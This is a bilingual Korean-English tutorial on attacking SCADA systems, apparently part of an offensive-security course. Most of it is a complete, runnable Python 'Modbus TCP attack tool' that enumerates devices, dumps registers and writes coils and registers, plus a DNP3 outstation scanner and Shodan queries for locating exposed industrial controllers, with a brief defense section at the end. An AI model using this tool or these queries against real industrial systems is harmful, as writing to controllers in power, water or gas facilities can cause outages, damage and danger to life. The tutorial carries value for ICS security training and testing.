> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# SCADA 공격 기법

## 0. 초보자를 위한 개념 이해

### SCADA란?

**SCADA(Supervisory Control And Data Acquisition)**는 넓은 지역에 분산된 산업 시설을 원격에서 감시하고 제어하는 시스템입니다.

```
SCADA가 쓰이는 곳:
  전력망:
    중앙 통제 센터 → 수십~수백 개의 변전소 원격 관리
    전력 수요 변화에 따라 발전량 조절
    
  가스/오일 파이프라인:
    수천 km 파이프라인의 압력, 흐름 모니터링
    밸브 원격 제어
    
  수도 시스템:
    저수지, 펌프장, 정수장 원격 모니터링
    수질 센서 데이터 수집
```

**SCADA 구성요소:**
```
Master Station (마스터 스테이션):
  - 중앙 제어 서버
  - HMI (사람-기계 인터페이스) 포함
  - 운영자가 모니터링하는 곳

RTU (Remote Terminal Unit, 원격 단말 장치):
  - 현장 장치 근처에 설치
  - 센서에서 데이터 수집
  - 마스터 스테이션의 명령 실행

통신:
  마스터 ↔ RTU 통신
  Modbus, DNP3, IEC 60870-5 등의 프로토콜 사용

HMI (Human Machine Interface):
  - 운영자가 시스템 상태를 보는 화면
  - Windows PC에서 실행
  - 보안 취약점의 주요 경로
```

### SCADA 공격의 위험성

```
SCADA 공격으로 가능한 것:
  전력 차단 → 대규모 정전
  댐 수문 조작 → 홍수
  가스 압력 조작 → 폭발
  정수 처리 방해 → 독성 음료수 공급

실제 사례:
  2015년 우크라이나 전력망 공격:
    → 225,000명 정전 (약 6시간)
    → BlackEnergy 악성코드로 변전소 원격 조작
    
  2017년 Triton/TRISIS 공격:
    → 사우디아라비아 석유화학 시설
    → Triconex SIS (안전 시스템) 조작 시도
    → 공장 폭발 방지 시스템 무력화 시도 (발각됨)
```

---

## SCADA 시스템 취약점 클래스

```
취약점 분류
├── 프로토콜 취약점 — 인증/암호화 없는 산업 프로토콜
├── HMI 취약점 — Windows 기반, 구버전 소프트웨어
├── 원격 접근 — RDP, VNC, 모뎀 (직접 인터넷 노출)
├── 엔지니어링 소프트웨어 — TIA Portal, Wonderware 취약점
└── 물리적 접근 — USB, RS-232 포트
```

## Modbus 공격

```python
#!/usr/bin/env python3
"""Modbus TCP 공격 도구 (인증된 테스트 환경 전용)."""

import argparse
import socket
import struct
import sys
from dataclasses import dataclass
from typing import Iterator


@dataclass
class ModbusResponse:
    transaction_id: int
    function_code: int
    data: bytes
    is_exception: bool
    exception_code: int = 0


def build_modbus_request(
    function_code: int,
    data: bytes,
    unit_id: int = 1,
    transaction_id: int = 1,
) -> bytes:
    """Modbus TCP ADU 생성."""
    pdu = bytes([unit_id, function_code]) + data
    header = struct.pack(">HHH",
        transaction_id,  # 트랜잭션 ID
        0x0000,          # 프로토콜 ID (항상 0)
        len(pdu),        # 길이
    )
    return header + pdu


def parse_modbus_response(raw: bytes) -> ModbusResponse | None:
    if len(raw) < 8:
        return None
    trans_id, _, length = struct.unpack(">HHH", raw[:6])
    if len(raw) < 6 + length:
        return None
    # unit_id = raw[6]
    fc = raw[7]
    data = raw[8:]
    is_exception = bool(fc & 0x80)
    exc_code = data[0] if is_exception and data else 0
    return ModbusResponse(
        transaction_id=trans_id,
        function_code=fc & 0x7F,
        data=data,
        is_exception=is_exception,
        exception_code=exc_code,
    )


class ModbusAttacker:
    def __init__(self, host: str, port: int = 502, timeout: float = 3.0):
        self.host = host
        self.port = port
        self.timeout = timeout
        self._trans = 0

    def _next_trans(self) -> int:
        self._trans = (self._trans + 1) % 0xFFFF
        return self._trans

    def _send_recv(self, fc: int, data: bytes, unit: int = 1) -> ModbusResponse | None:
        request = build_modbus_request(fc, data, unit, self._next_trans())
        try:
            with socket.create_connection(
                (self.host, self.port), timeout=self.timeout
            ) as s:
                s.send(request)
                raw = s.recv(512)
                return parse_modbus_response(raw)
        except Exception as e:
            print(f"[!] 통신 오류: {e}", file=sys.stderr)
            return None

    def read_coils(self, start: int, count: int, unit: int = 1) -> list[bool] | None:
        """FC01: 코일(디지털 출력) 읽기."""
        data = struct.pack(">HH", start, count)
        resp = self._send_recv(0x01, data, unit)
        if not resp or resp.is_exception:
            return None
        bits: list[bool] = []
        for byte in resp.data[1:]:
            for i in range(8):
                bits.append(bool(byte & (1 << i)))
        return bits[:count]

    def read_holding_registers(
        self, start: int, count: int, unit: int = 1
    ) -> list[int] | None:
        """FC03: 보유 레지스터 읽기."""
        data = struct.pack(">HH", start, count)
        resp = self._send_recv(0x03, data, unit)
        if not resp or resp.is_exception:
            return None
        values = []
        raw = resp.data[1:]
        for i in range(0, len(raw) - 1, 2):
            values.append(struct.unpack(">H", raw[i:i+2])[0])
        return values

    def write_single_coil(
        self, address: int, value: bool, unit: int = 1
    ) -> bool:
        """FC05: 단일 코일 쓰기."""
        data = struct.pack(">HH", address, 0xFF00 if value else 0x0000)
        resp = self._send_recv(0x05, data, unit)
        return resp is not None and not resp.is_exception

    def write_single_register(
        self, address: int, value: int, unit: int = 1
    ) -> bool:
        """FC06: 단일 레지스터 쓰기."""
        data = struct.pack(">HH", address, value & 0xFFFF)
        resp = self._send_recv(0x06, data, unit)
        return resp is not None and not resp.is_exception

    def write_multiple_registers(
        self, start: int, values: list[int], unit: int = 1
    ) -> bool:
        """FC16: 다중 레지스터 쓰기."""
        count = len(values)
        byte_count = count * 2
        data = struct.pack(">HHB", start, count, byte_count)
        data += struct.pack(f">{count}H", *values)
        resp = self._send_recv(0x10, data, unit)
        return resp is not None and not resp.is_exception

    def enumerate_units(self, start: int = 1, end: int = 247) -> list[int]:
        """활성 Unit ID 열거."""
        active: list[int] = []
        for uid in range(start, end + 1):
            resp = self._send_recv(0x03, struct.pack(">HH", 0, 1), uid)
            if resp and not resp.is_exception:
                active.append(uid)
                print(f"  [+] Unit ID {uid} 응답")
        return active

    def dump_all_registers(
        self, start: int = 0, end: int = 0xFFFF, unit: int = 1
    ) -> dict[int, int]:
        """전체 레지스터 덤프."""
        registers: dict[int, int] = {}
        batch = 125  # Modbus 최대 배치
        for addr in range(start, end + 1, batch):
            count = min(batch, end - addr + 1)
            values = self.read_holding_registers(addr, count, unit)
            if values:
                for i, v in enumerate(values):
                    registers[addr + i] = v
        return registers


def replay_attack(
    host: str, port: int, commands: list[tuple[int, bytes]]
) -> None:
    """캡처한 Modbus 명령 리플레이."""
    attacker = ModbusAttacker(host, port)
    for fc, data in commands:
        resp = attacker._send_recv(fc, data)
        status = "성공" if resp and not resp.is_exception else "실패"
        print(f"  FC{fc:02X} → {status}")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Modbus TCP 공격 도구 (승인된 테스트 환경 전용)"
    )
    parser.add_argument("host")
    parser.add_argument("-p", "--port", type=int, default=502)
    parser.add_argument("-u", "--unit", type=int, default=1)
    sub = parser.add_subparsers(dest="cmd", required=True)

    sub.add_parser("enum-units", help="Unit ID 열거")
    
    read_r = sub.add_parser("read-regs", help="레지스터 읽기")
    read_r.add_argument("start", type=int)
    read_r.add_argument("count", type=int)

    write_r = sub.add_parser("write-reg", help="레지스터 쓰기")
    write_r.add_argument("address", type=int)
    write_r.add_argument("value", type=int)

    write_c = sub.add_parser("write-coil", help="코일 쓰기")
    write_c.add_argument("address", type=int)
    write_c.add_argument("value", type=int, choices=[0, 1])

    sub.add_parser("dump", help="전체 레지스터 덤프")

    args = parser.parse_args()
    attacker = ModbusAttacker(args.host, args.port)

    if args.cmd == "enum-units":
        print(f"[*] Unit ID 열거...")
        active = attacker.enumerate_units()
        print(f"[+] 활성 Unit ID: {active}")

    elif args.cmd == "read-regs":
        values = attacker.read_holding_registers(args.start, args.count, args.unit)
        if values:
            for i, v in enumerate(values):
                print(f"  [{args.start + i:5d}] = {v:5d} (0x{v:04X})")

    elif args.cmd == "write-reg":
        ok = attacker.write_single_register(args.address, args.value, args.unit)
        print(f"[{'+'if ok else'!'}] 레지스터 {args.address} = {args.value}: "
              f"{'성공' if ok else '실패'}")

    elif args.cmd == "write-coil":
        ok = attacker.write_single_coil(args.address, bool(args.value), args.unit)
        print(f"[{'+'if ok else'!'}] 코일 {args.address} = {args.value}: "
              f"{'성공' if ok else '실패'}")

    elif args.cmd == "dump":
        print(f"[*] 전체 레지스터 덤프...")
        regs = attacker.dump_all_registers(unit=args.unit)
        non_zero = {k: v for k, v in regs.items() if v != 0}
        print(f"[+] 비제로 레지스터: {len(non_zero)}개")
        for addr, val in sorted(non_zero.items())[:50]:
            print(f"  [{addr:5d}] = {val:5d} (0x{val:04X})")


if __name__ == "__main__":
    main()
```

## DNP3 공격

```python
#!/usr/bin/env python3
"""DNP3 프로토콜 분석 (전력/수도 SCADA)."""

import socket
import struct


DNP3_START = 0x0564
DNP3_BROADCAST = 0xFFFF


def build_dnp3_read(
    dest: int,
    src: int = 0x0001,
    group: int = 12,
    variation: int = 0,
) -> bytes:
    """DNP3 읽기 요청 프레임 생성 (간략화)."""
    # 헤더
    header = struct.pack("<HBH H",
        DNP3_START,   # 시작 바이트
        0x00,         # 길이 (나중에 설정)
        0x44,         # 제어 (0x44 = DIR + PRM + FIR + FIN)
        dest,         # 목적지
    )
    header += struct.pack("<H", src)  # 출처

    # 애플리케이션 레이어: Read 요청
    app = bytes([
        0xC0, 0x01,    # FIR+FIN+SEQ, Function Code 1 (Read)
        group, variation,  # Object Header
        0x06,          # Qualifier: 모든 객체
    ])

    # CRC 추가 (간략화 — 실제로는 DNP3 CRC 계산 필요)
    return header + app


def scan_dnp3(host: str, port: int = 20000) -> dict | None:
    """DNP3 아웃스테이션 탐지."""
    request = build_dnp3_read(dest=DNP3_BROADCAST)
    try:
        with socket.create_connection((host, port), timeout=3.0) as s:
            s.send(request)
            resp = s.recv(256)
            if resp and resp[:2] == bytes([0x05, 0x64]):
                dest = struct.unpack("<H", resp[4:6])[0]
                src = struct.unpack("<H", resp[6:8])[0]
                return {
                    "protocol": "DNP3",
                    "dest_address": dest,
                    "src_address": src,
                    "raw": resp.hex(),
                }
    except Exception:
        pass
    return None
```

## Shodan을 활용한 SCADA 탐지

```bash
# Shodan 쿼리 (승인된 자산 조사 용도)
# Modbus 노출 장치
shodan search "port:502"

# S7comm 노출
shodan search "port:102 Siemens"

# DNP3 노출
shodan search "port:20000"

# SCADA HMI
shodan search "product:Wonderware" OR "product:iFIX" OR "SCADA"

# 특정 국가 PLC
shodan search "port:44818 country:KR"

# OPC-UA 서버
shodan search "port:4840"
```

## 방어 전략

```
네트워크 세분화
├── Purdue 모델 엄격 적용
├── 단방향 게이트웨이 (데이터 다이오드)
├── IT/OT 경계 DMZ
└── VLAN + 방화벽 정책

모니터링
├── OT 특화 IDS (Claroty, Dragos, Nozomi)
├── 프로토콜 화이트리스트
├── 비정상 명령 탐지 (Modbus FC06 모니터링)
└── 자산 인벤토리 자동화
```

다음 파일에서 PLC 익스플로잇을 다룬다.

---

<a name="english"></a>

# SCADA Attack Techniques

## SCADA System Vulnerability Classes

```
Vulnerability Categories
├── Protocol vulnerabilities — Industrial protocols without authentication/encryption
├── HMI vulnerabilities — Windows-based, outdated software
├── Remote access — RDP, VNC, modems (direct internet exposure)
├── Engineering software — TIA Portal, Wonderware vulnerabilities
└── Physical access — USB, RS-232 ports
```

## Modbus Attacks

```python
#!/usr/bin/env python3
"""Modbus TCP attack tool (for authorized test environments only)."""

import argparse
import socket
import struct
import sys
from dataclasses import dataclass
from typing import Iterator


@dataclass
class ModbusResponse:
    transaction_id: int
    function_code: int
    data: bytes
    is_exception: bool
    exception_code: int = 0


def build_modbus_request(
    function_code: int,
    data: bytes,
    unit_id: int = 1,
    transaction_id: int = 1,
) -> bytes:
    """Build Modbus TCP ADU."""
    pdu = bytes([unit_id, function_code]) + data
    header = struct.pack(">HHH",
        transaction_id,  # Transaction ID
        0x0000,          # Protocol ID (always 0)
        len(pdu),        # Length
    )
    return header + pdu


def parse_modbus_response(raw: bytes) -> ModbusResponse | None:
    if len(raw) < 8:
        return None
    trans_id, _, length = struct.unpack(">HHH", raw[:6])
    if len(raw) < 6 + length:
        return None
    # unit_id = raw[6]
    fc = raw[7]
    data = raw[8:]
    is_exception = bool(fc & 0x80)
    exc_code = data[0] if is_exception and data else 0
    return ModbusResponse(
        transaction_id=trans_id,
        function_code=fc & 0x7F,
        data=data,
        is_exception=is_exception,
        exception_code=exc_code,
    )


class ModbusAttacker:
    def __init__(self, host: str, port: int = 502, timeout: float = 3.0):
        self.host = host
        self.port = port
        self.timeout = timeout
        self._trans = 0

    def _next_trans(self) -> int:
        self._trans = (self._trans + 1) % 0xFFFF
        return self._trans

    def _send_recv(self, fc: int, data: bytes, unit: int = 1) -> ModbusResponse | None:
        request = build_modbus_request(fc, data, unit, self._next_trans())
        try:
            with socket.create_connection(
                (self.host, self.port), timeout=self.timeout
            ) as s:
                s.send(request)
                raw = s.recv(512)
                return parse_modbus_response(raw)
        except Exception as e:
            print(f"[!] Communication error: {e}", file=sys.stderr)
            return None

    def read_coils(self, start: int, count: int, unit: int = 1) -> list[bool] | None:
        """FC01: Read coils (digital outputs)."""
        data = struct.pack(">HH", start, count)
        resp = self._send_recv(0x01, data, unit)
        if not resp or resp.is_exception:
            return None
        bits: list[bool] = []
        for byte in resp.data[1:]:
            for i in range(8):
                bits.append(bool(byte & (1 << i)))
        return bits[:count]

    def read_holding_registers(
        self, start: int, count: int, unit: int = 1
    ) -> list[int] | None:
        """FC03: Read holding registers."""
        data = struct.pack(">HH", start, count)
        resp = self._send_recv(0x03, data, unit)
        if not resp or resp.is_exception:
            return None
        values = []
        raw = resp.data[1:]
        for i in range(0, len(raw) - 1, 2):
            values.append(struct.unpack(">H", raw[i:i+2])[0])
        return values

    def write_single_coil(
        self, address: int, value: bool, unit: int = 1
    ) -> bool:
        """FC05: Write single coil."""
        data = struct.pack(">HH", address, 0xFF00 if value else 0x0000)
        resp = self._send_recv(0x05, data, unit)
        return resp is not None and not resp.is_exception

    def write_single_register(
        self, address: int, value: int, unit: int = 1
    ) -> bool:
        """FC06: Write single register."""
        data = struct.pack(">HH", address, value & 0xFFFF)
        resp = self._send_recv(0x06, data, unit)
        return resp is not None and not resp.is_exception

    def write_multiple_registers(
        self, start: int, values: list[int], unit: int = 1
    ) -> bool:
        """FC16: Write multiple registers."""
        count = len(values)
        byte_count = count * 2
        data = struct.pack(">HHB", start, count, byte_count)
        data += struct.pack(f">{count}H", *values)
        resp = self._send_recv(0x10, data, unit)
        return resp is not None and not resp.is_exception

    def enumerate_units(self, start: int = 1, end: int = 247) -> list[int]:
        """Enumerate active Unit IDs."""
        active: list[int] = []
        for uid in range(start, end + 1):
            resp = self._send_recv(0x03, struct.pack(">HH", 0, 1), uid)
            if resp and not resp.is_exception:
                active.append(uid)
                print(f"  [+] Unit ID {uid} responded")
        return active

    def dump_all_registers(
        self, start: int = 0, end: int = 0xFFFF, unit: int = 1
    ) -> dict[int, int]:
        """Dump all registers."""
        registers: dict[int, int] = {}
        batch = 125  # Modbus maximum batch size
        for addr in range(start, end + 1, batch):
            count = min(batch, end - addr + 1)
            values = self.read_holding_registers(addr, count, unit)
            if values:
                for i, v in enumerate(values):
                    registers[addr + i] = v
        return registers


def replay_attack(
    host: str, port: int, commands: list[tuple[int, bytes]]
) -> None:
    """Replay captured Modbus commands."""
    attacker = ModbusAttacker(host, port)
    for fc, data in commands:
        resp = attacker._send_recv(fc, data)
        status = "success" if resp and not resp.is_exception else "failed"
        print(f"  FC{fc:02X} → {status}")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Modbus TCP attack tool (for authorized test environments only)"
    )
    parser.add_argument("host")
    parser.add_argument("-p", "--port", type=int, default=502)
    parser.add_argument("-u", "--unit", type=int, default=1)
    sub = parser.add_subparsers(dest="cmd", required=True)

    sub.add_parser("enum-units", help="Enumerate Unit IDs")

    read_r = sub.add_parser("read-regs", help="Read registers")
    read_r.add_argument("start", type=int)
    read_r.add_argument("count", type=int)

    write_r = sub.add_parser("write-reg", help="Write register")
    write_r.add_argument("address", type=int)
    write_r.add_argument("value", type=int)

    write_c = sub.add_parser("write-coil", help="Write coil")
    write_c.add_argument("address", type=int)
    write_c.add_argument("value", type=int, choices=[0, 1])

    sub.add_parser("dump", help="Dump all registers")

    args = parser.parse_args()
    attacker = ModbusAttacker(args.host, args.port)

    if args.cmd == "enum-units":
        print(f"[*] Enumerating Unit IDs...")
        active = attacker.enumerate_units()
        print(f"[+] Active Unit IDs: {active}")

    elif args.cmd == "read-regs":
        values = attacker.read_holding_registers(args.start, args.count, args.unit)
        if values:
            for i, v in enumerate(values):
                print(f"  [{args.start + i:5d}] = {v:5d} (0x{v:04X})")

    elif args.cmd == "write-reg":
        ok = attacker.write_single_register(args.address, args.value, args.unit)
        print(f"[{'+'if ok else'!'}] Register {args.address} = {args.value}: "
              f"{'success' if ok else 'failed'}")

    elif args.cmd == "write-coil":
        ok = attacker.write_single_coil(args.address, bool(args.value), args.unit)
        print(f"[{'+'if ok else'!'}] Coil {args.address} = {args.value}: "
              f"{'success' if ok else 'failed'}")

    elif args.cmd == "dump":
        print(f"[*] Dumping all registers...")
        regs = attacker.dump_all_registers(unit=args.unit)
        non_zero = {k: v for k, v in regs.items() if v != 0}
        print(f"[+] Non-zero registers: {len(non_zero)}")
        for addr, val in sorted(non_zero.items())[:50]:
            print(f"  [{addr:5d}] = {val:5d} (0x{val:04X})")


if __name__ == "__main__":
    main()
```

## DNP3 Attacks

```python
#!/usr/bin/env python3
"""DNP3 protocol analysis (power/water SCADA)."""

import socket
import struct


DNP3_START = 0x0564
DNP3_BROADCAST = 0xFFFF


def build_dnp3_read(
    dest: int,
    src: int = 0x0001,
    group: int = 12,
    variation: int = 0,
) -> bytes:
    """Build DNP3 read request frame (simplified)."""
    # Header
    header = struct.pack("<HBH H",
        DNP3_START,   # Start bytes
        0x00,         # Length (set later)
        0x44,         # Control (0x44 = DIR + PRM + FIR + FIN)
        dest,         # Destination
    )
    header += struct.pack("<H", src)  # Source

    # Application layer: Read request
    app = bytes([
        0xC0, 0x01,    # FIR+FIN+SEQ, Function Code 1 (Read)
        group, variation,  # Object Header
        0x06,          # Qualifier: all objects
    ])

    # Add CRC (simplified — actual DNP3 CRC calculation required)
    return header + app


def scan_dnp3(host: str, port: int = 20000) -> dict | None:
    """Detect DNP3 outstations."""
    request = build_dnp3_read(dest=DNP3_BROADCAST)
    try:
        with socket.create_connection((host, port), timeout=3.0) as s:
            s.send(request)
            resp = s.recv(256)
            if resp and resp[:2] == bytes([0x05, 0x64]):
                dest = struct.unpack("<H", resp[4:6])[0]
                src = struct.unpack("<H", resp[6:8])[0]
                return {
                    "protocol": "DNP3",
                    "dest_address": dest,
                    "src_address": src,
                    "raw": resp.hex(),
                }
    except Exception:
        pass
    return None
```

## SCADA Discovery with Shodan

```bash
# Shodan queries (for authorized asset investigation)
# Exposed Modbus devices
shodan search "port:502"

# Exposed S7comm
shodan search "port:102 Siemens"

# Exposed DNP3
shodan search "port:20000"

# SCADA HMI
shodan search "product:Wonderware" OR "product:iFIX" OR "SCADA"

# PLCs in a specific country
shodan search "port:44818 country:KR"

# OPC-UA servers
shodan search "port:4840"
```

## Defense Strategies

```
Network Segmentation
├── Strict enforcement of the Purdue model
├── Unidirectional gateways (data diodes)
├── IT/OT boundary DMZ
└── VLAN + firewall policies

Monitoring
├── OT-specific IDS (Claroty, Dragos, Nozomi)
├── Protocol whitelisting
├── Anomalous command detection (Modbus FC06 monitoring)
└── Automated asset inventory
```

The next file covers PLC exploitation.
